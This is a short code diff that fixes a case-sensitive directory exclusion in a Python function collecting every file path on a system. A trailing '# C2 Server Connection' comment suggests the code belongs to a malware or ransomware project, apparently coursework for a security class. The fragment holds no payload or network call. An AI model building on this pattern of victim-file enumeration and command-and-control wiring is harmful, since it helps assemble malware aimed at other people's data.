@@ -61,7 +61,7 @@ def load_file_paths():
         for name in files:
             path = os.path.join(root, name)
             global file_paths
-            if "CECS378" not in path.lower():
+            if "cecs378" not in path.lower():
                 file_paths.append(os.path.join(root, name))
 
 # C2 Server Connection
